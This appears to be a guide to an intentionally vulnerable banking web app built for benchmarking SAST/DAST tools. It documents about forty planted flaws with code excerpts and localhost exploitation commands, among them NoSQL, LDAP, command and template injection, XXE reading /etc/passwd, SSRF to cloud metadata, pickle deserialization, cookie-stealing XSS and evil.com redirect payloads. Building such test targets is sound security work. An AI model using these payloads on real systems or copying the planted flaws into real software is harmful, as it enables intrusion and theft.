# SecureBank Vulnerable Application - Vulnerability Guide

**WARNING:** This is an intentionally vulnerable banking application designed for SAST/DAST tool testing. DO NOT deploy in production environments. DO NOT use with real financial data.

## Overview

SecureBank appears to be a legitimate online banking platform with:
- User authentication and account management
- Money transfer capabilities
- Credit card processing
- Admin panel for bank management
- Account statement generation
- Multiple database backends (MongoDB + SQLite)

All vulnerabilities are disguised as legitimate banking functionality.

---

## Backend Vulnerabilities (Python/Flask)

### 1. Mass Assignment - User Registration

**Location:** `/api/auth/register` (line ~62)

**Disguised As:** Flexible user registration that accepts any profile fields

**Vulnerable Code:**
```python
user_data = data.copy()  # Accepts ALL fields from request
db.users.insert_one(user_data)  # Inserts without validation
```

**Exploitation:**
```bash
curl -X POST http://localhost:5007/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username": "attacker", "password": "Pass123", "role": "admin", "credit_score": 850, "is_verified": true}'
```

---

### 2. Weak Password Hashing (MD5)

**Location:** `/api/auth/register` and `/api/auth/login`

**Disguised As:** Password encryption for user accounts

**Vulnerable Code:**
```python
user_data['password'] = hashlib.md5(user_data['password'].encode()).hexdigest()
```

**Impact:** MD5 is cryptographically broken, passwords can be cracked instantly with rainbow tables.

---

### 3. NoSQL Injection - MongoDB

**Location:** `/api/auth/login` (line ~94)

**Disguised As:** MongoDB user lookup

**Vulnerable Code:**
```python
query = {"username": username, "password": hashlib.md5(password.encode()).hexdigest()}
user = db.users.find_one(query)  # Accepts operators like $ne, $gt
```

**Exploitation:**
```bash
curl -X POST http://localhost:5007/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'
```

---

### 4. LDAP Injection

**Location:** `/api/auth/ldap-login` (line ~112)

**Disguised As:** Enterprise LDAP authentication

**Vulnerable Code:**
```python
ldap_filter = f"(uid={username})"  # Unsanitized user input
conn.search_s(LDAP_BASE_DN, ldap.SCOPE_SUBTREE, ldap_filter)
```

**Exploitation:**
```bash
curl -X POST http://localhost:5007/api/auth/ldap-login \
  -H "Content-Type: application/json" \
  -d '{"username": "*)(uid=*))(&(uid=*", "password": "any"}'
```

---

### 5. IDOR (Insecure Direct Object Reference) - Account Balance

**Location:** `/api/account/balance` (line ~131)

**Disguised As:** Account balance lookup

**Vulnerable Code:**
```python
cursor.execute(f"SELECT * FROM accounts WHERE account_number = '{account_number}'")  # No auth check!
```

**Exploitation:**
```bash
curl "http://localhost:5007/api/account/balance?account=SB-1000003"
curl "http://localhost:5007/api/account/balance?account=SB-1000001' OR '1'='1"
```

---

### 6. Server-Side Template Injection (SSTI)

**Location:** `/api/account/statement` (line ~151)

**Disguised As:** Customizable statement template

**Vulnerable Code:**
```python
template = Template(template_str)
rendered = template.render(account_number=account_number, date=datetime.now())
```

**Exploitation:**
```bash
# Jinja2 SSTI to read files
curl -X POST http://localhost:5007/api/account/statement \
  -H "Content-Type: application/json" \
  -d '{"account_number": "test", "template": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read()}}"}'
```

---

### 7. Zip Slip

**Location:** `/api/account/statement` (line ~165)

**Disguised As:** Batch statement upload via archive

**Vulnerable Code:**
```python
with zipfile.ZipFile(zip_path, 'r') as zip_ref:
    zip_ref.extractall(STATEMENT_FOLDER)  # No path validation!
```

**Exploitation:** Upload a ZIP with `../../../etc/cron.d/evil` to write outside upload folder.

---

### 8. CSV Injection

**Location:** `/api/account/export` (line ~192)

**Disguised As:** CSV export of transaction history

**Vulnerable Code:**
```python
writer.writerow([t['id'], t['from_account'], t['amount'], t['description']])  # No sanitization
```

**Exploitation:**
```bash
# Create transaction with malicious description
curl -X POST http://localhost:5007/api/transfer \
  -d '{"description": "=CMD|'/C calc'!A0", "amount": 1, ...}'

# Export triggers formula execution in Excel
```

---

### 9. Race Condition (TOCTOU) - Money Transfer

**Location:** `/api/transfer` (line ~218)

**Disguised As:** Fast money transfer processing

**Vulnerable Code:**
```python
cursor.execute(f"SELECT balance FROM accounts WHERE account_number = '{from_account}'")
source = cursor.fetchone()
if source['balance'] >= amount:
    cursor.execute(f"UPDATE accounts SET balance = balance - {amount}...")  # Time gap = race condition
```

**Exploitation:** Send 100 simultaneous requests to overdraw account.

---

### 10. Business Logic Flaw - No Ownership Verification

**Location:** `/api/transfer` (line ~225)

**Disguised As:** Direct account transfer

**Vulnerable Code:**
```python
# No verification that from_account belongs to current user!
cursor.execute(f"UPDATE accounts SET balance = balance - {amount} WHERE account_number = '{from_account}'")
```

---

### 11. XXE (XML External Entity)

**Location:** `/api/payments/process` (line ~248)

**Disguised As:** XML payment processing for enterprise integration

**Vulnerable Code:**
```python
root = ET.fromstring(xml_data)  # No entity resolution disabled!
```

**Exploitation:**
```bash
curl -X POST http://localhost:5007/api/payments/process \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><payment><card_number>&xxe;</card_number></payment>'
```

---

### 12. ReDoS (Regular Expression Denial of Service)

**Location:** `/api/payments/validate-card` (line ~267)

**Disguised As:** Credit card number validation

**Vulnerable Code:**
```python
pattern = r"^(\d+)+$"  # Catastrophic backtracking!
re.match(pattern, card_number)
```

**Exploitation:** Send a card number with many digits to cause CPU exhaustion.

---

### 13. Host Header Injection

**Location:** `/api/admin/users` (line ~286)

**Disguised As:** Dynamic admin panel URL generation

**Vulnerable Code:**
```python
base_url = f"http://{x_forwarded_host or host}"  # User-controlled header used in URLs
```

**Exploitation:**
```bash
curl -H "X-Forwarded-Host: evil.com" http://localhost:5007/api/admin/users
# Response contains links to evil.com
```

---

### 14. Insecure Deserialization (Pickle)

**Location:** `/api/admin/config` (line ~310)

**Disguised As:** Configuration object storage

**Vulnerable Code:**
```python
config = pickle.loads(config_data)  # Dangerous!
```

**Exploitation:**
```python
import pickle, os, base64
payload = pickle.dumps({'code': '__import__("os").system("id")'})
# Send base64(payload) to endpoint
```

---

### 15. Command Injection - Admin Logs

**Location:** `/api/admin/logs` (line ~333)

**Disguised As:** Log file viewer

**Vulnerable Code:**
```python
cmd = f"cat {log_file}"  # log_file from user input
logs = subprocess.check_output(cmd, shell=True)
```

**Exploitation:**
```bash
curl "http://localhost:5007/api/admin/logs?date=2024-01-01;cat /etc/passwd"
```

---

### 16. Server-Side Request Forgery (SSRF)

**Location:** `/api/admin/ping` (line ~357)

**Disguised As:** Network diagnostics with HTTP probe

**Vulnerable Code:**
```python
if target.startswith('http'):
    resp = requests.get(target, timeout=10)  # Can access internal services
```

**Exploitation:**
```bash
curl "http://localhost:5007/api/admin/ping?target=http://169.254.169.254/latest/meta-data/"
curl "http://localhost:5007/api/admin/ping?target=http://localhost:5007/api/admin/users"
```

---

### 17. Information Disclosure - Debug Endpoint

**Location:** `/api/debug/info` (line ~390)

**Disguised As:** System diagnostics for troubleshooting

**Vulnerable Code:**
```python
return jsonify({
    "environment": os.environ,  # All env vars including secrets!
    "app_config": {"secret_key": app.secret_key, ...}
})
```

---

### 18. Verbose Error Disclosure

**Location:** `/api/error` (line ~406)

**Disguised As:** Error testing utility

**Vulnerable Code:**
```python
return jsonify({
    "error": str(e),
    "traceback": traceback.format_exc(),  # Full stack traces!
})
```

---

### 19. Unrestricted File Upload

**Location:** `/api/documents/upload` (line ~430)

**Disguised As:** Document upload for KYC verification

**Vulnerable Code:**
```python
# No extension/mimetype validation!
file_path = os.path.join(UPLOAD_FOLDER, filename)
file.save(file_path)
```

**Exploitation:** Upload `.php`, `.jsp`, `.py` files and execute them.

---

### 20. Path Traversal - Document View

**Location:** `/api/documents/view/<filename>` (line ~446)

**Disguised As:** Document viewer

**Vulnerable Code:**
```python
file_path = os.path.join(UPLOAD_FOLDER, filename)  # No sanitization!
```

**Exploitation:**
```bash
curl "http://localhost:5007/api/documents/view/../../../etc/passwd"
```

---

### 21. Open Redirect

**Location:** `/api/redirect` (line ~478)

**Disguised As:** Post-login redirect

**Vulnerable Code:**
```python
return redirect(url, code=302)  # No validation!
```

**Exploitation:**
```bash
curl "http://localhost:5007/api/redirect?url=https://evil.com/phishing"
```

---

### 22. Web Cache Poisoning

**Location:** `/api/public/rates` (line ~495)

**Disguised As:** Exchange rates API with geo-targeting

**Vulnerable Code:**
```python
x_country = request.headers.get('X-Country', 'US')  # Unkeyed header
response.headers['Cache-Control'] = 'public, max-age=3600'
```

---

### 23. Overly Permissive CORS

**Location:** `/api/public/rates` (line ~507)

**Disguised As:** Public API for third-party integrations

**Vulnerable Code:**
```python
response.headers['Access-Control-Allow-Origin'] = '*'
response.headers['Access-Control-Allow-Credentials'] = 'true'  # Dangerous combo!
```

---

### 24. HTTP Parameter Pollution

**Location:** `/api/user/profile` (line ~515)

**Disguised As:** Profile lookup by user ID

**Vulnerable Code:**
```python
user_id = request.args.get('user_id')  # Only gets first value
all_ids = request.args.getlist('user_id')  # Gets all - may cause unexpected behavior
```

---

### 25. GraphQL Injection / Introspection

**Location:** `/api/graphql` (line ~545)

**Disguised As:** GraphQL API endpoint

**Vulnerable Code:**
```python
if 'query' in query.lower() or '__schema' in query:  # Allows introspection
    return jsonify({"__schema": {...all_types...}})  # Full schema disclosure!
```

---

### 26. JWT Algorithm Confusion / None Algorithm

**Location:** `/api/token/decode` (line ~575)

**Disguised As:** Token debugging utility

**Vulnerable Code:**
```python
decoded = jwt.decode(token, app.secret_key, algorithms=[algorithm])  # User controls algorithm!
```

**Exploitation:**
```bash
curl -X POST http://localhost:5007/api/token/decode \
  -d '{"token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0...", "algorithm": "none"}'
```

---

### 27. Session Fixation

**Location:** `/api/auth/login` (line ~103)

**Disguised As:** Session management

**Vulnerable Code:**
```python
session_id = data.get('session_id') or str(ObjectId())  # Accepts client-provided session!
session['session_id'] = session_id
```

---

## Frontend Vulnerabilities (Next.js/React)

### 28. DOM-based XSS via location.hash

**Location:** `page.tsx` landing page

**Disguised As:** Promo code display from URL

**Vulnerable Code:**
```tsx
const hash = window.location.hash.slice(1);
if (hash) {
  promoDiv.innerHTML = decodeURIComponent(hash);  // innerHTML with user input!
}
```

**Exploitation:** `http://localhost:3001/#<img src=x onerror=alert(document.cookie)>`

---

### 29. Prototype Pollution via URL

**Location:** `page.tsx` landing page

**Disguised As:** Configuration from query parameter

**Vulnerable Code:**
```tsx
const userConfig = JSON.parse(config);
const merged = { ...defaultConfig, ...userConfig };  // Pollutes prototype!
```

**Exploitation:** `?config={"__proto__":{"isAdmin":true}}`

---

### 30. postMessage Without Origin Validation

**Location:** `page.tsx` landing page

**Disguised As:** Cross-window communication for widgets

**Vulnerable Code:**
```tsx
const handler = (event: MessageEvent) => {
  // No origin check!
  if (event.data.type === 'exec') {
    eval(event.data.script);  // Arbitrary code execution!
  }
};
```

---

### 31. Storing Plaintext Credentials

**Location:** `login/page.tsx`

**Disguised As:** "Remember me" feature

**Vulnerable Code:**
```tsx
if (rememberMe) {
  localStorage.setItem('saved_credentials', JSON.stringify({ username, password }));
}
```

---

### 32. Open Redirect via next Parameter

**Location:** `login/page.tsx`

**Disguised As:** Post-login redirect

**Vulnerable Code:**
```tsx
const nextUrl = new URLSearchParams(window.location.search).get('next') || '/dashboard';
router.push(nextUrl);  // No validation!
```

**Exploitation:** `/login?next=https://evil.com/phishing`

---

### 33. Information Disclosure via Debug Mode

**Location:** `login/page.tsx`

**Disguised As:** Debug flag for troubleshooting

**Vulnerable Code:**
```tsx
const debug = new URLSearchParams(window.location.search).get('debug');
if (debug === 'true') {
  setDebugInfo(`Attempting login with: ${username} / ${password}`);
  console.log('Login response:', data);
}
```

---

### 34. Mass Assignment via Hidden Field

**Location:** `register/page.tsx`

**Disguised As:** Role assignment (hidden field)

**Vulnerable Code:**
```tsx
<input type="hidden" name="role" value={formData.role} />  // Can be modified!
```

---

### 35. Clickjacking - No X-Frame-Options

**Location:** `transfer/page.tsx`

**Disguised As:** Money transfer form

**Vulnerable Code:**
```tsx
// No X-Frame-Options header set
// Attempts to disable protection:
meta.httpEquiv = 'X-Frame-Options';
meta.content = 'ALLOWALL';
```

**Exploitation:** Attacker frames the transfer page with transparent overlay.

---

### 36. CSRF (Missing Token)

**Location:** `transfer/page.tsx`

**Disguised As:** Transfer submission

**Vulnerable Code:**
```tsx
fetch('http://localhost:5007/api/transfer', {
  method: 'POST',
  // No CSRF token!
});
```

---

### 37. Insecure Token Storage

**Location:** `dashboard/page.tsx`

**Disguised As:** JWT persistence

**Vulnerable Code:**
```tsx
localStorage.setItem('token', data.token);  // Vulnerable to XSS extraction
```

---

### 38. Client-Side JWT Decoding

**Location:** `dashboard/page.tsx`

**Disguised As:** Token parsing for user info

**Vulnerable Code:**
```tsx
const payload = JSON.parse(atob(token.split('.')[1]));  // No signature verification!
```

---

### 39. Auto-refresh Without Expiration Check

**Location:** `dashboard/page.tsx`

**Disguised As:** Token refresh for seamless experience

**Vulnerable Code:**
```tsx
const refreshToken = async () => {
  const response = await fetch('http://localhost:5007/api/token/refresh', {...});
  // No expiration check before refresh!
};
```

---

### 40. Sensitive Data Exposure in UI

**Location:** `dashboard/page.tsx`

**Disguised As:** Complete user profile display

**Vulnerable Code:**
```tsx
{user.ssn && <p>SSN: {user.ssn}</p>}  // Full SSN displayed!
```

---

## Testing Your SAST Tool

Your SAST should detect:

1. **Injection:** SQL, NoSQL, LDAP, Command, SSTI, XXE
2. **Authentication Issues:** Weak hashing, session fixation, JWT manipulation
3. **Authorization Issues:** IDOR, missing access control, mass assignment
4. **Client-Side Issues:** XSS (DOM-based), prototype pollution, postMessage
5. **Cryptography:** MD5 usage, weak JWT algorithms
6. **Configuration:** Debug endpoints, CORS misconfig, verbose errors
7. **File Operations:** Path traversal, unrestricted upload, zip slip
8. **Network:** SSRF, open redirect, host header injection
9. **Business Logic:** Race conditions, price manipulation
10. **Secrets:** Hardcoded keys, exposed credentials

All vulnerabilities are disguised as legitimate banking features - your SAST should look past the business context to identify the dangerous patterns.

---

## Running the Application

### Backend
```bash
cd benchmark/servers/vulnerable-server-bank/backend
pip install flask flask-cors pymongo pyjwt ldap3 requests jinja2
# Install MongoDB locally or use MongoDB Atlas
python app.py
```

### Frontend
```bash
cd benchmark/servers/vulnerable-server-bank/frontend
npm install
npm run dev
```

Access at:
- Landing page: http://localhost:3001
- Login: http://localhost:3001/login
- Dashboard: http://localhost:3001/dashboard
- Admin: http://localhost:3001/admin (requires admin role)

**WARNING:** This application is intentionally vulnerable. Use only in isolated testing environments.
